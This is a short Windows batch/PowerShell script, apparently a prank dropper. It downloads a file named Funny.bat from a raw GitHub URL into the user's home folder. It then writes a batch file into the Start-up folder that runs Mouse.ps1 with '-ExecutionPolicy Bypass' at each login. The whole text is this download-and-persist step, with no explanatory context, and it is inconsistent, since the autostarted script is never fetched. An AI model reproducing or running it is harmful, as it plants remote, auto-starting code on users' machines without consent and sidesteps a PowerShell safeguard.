cd %homepath%
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Babyporkchop/Scripts/Mouse/On Startup/Centre/Funny.bat' -OutFile .\Funny.bat
cd %appdata%\Microsoft\Windows\Start Menu\Programs\Start-up
echo cd ^%homepath^% > A.bat
echo powershell -ExecutionPolicy Bypass -File Mouse.ps1 >> A.bat
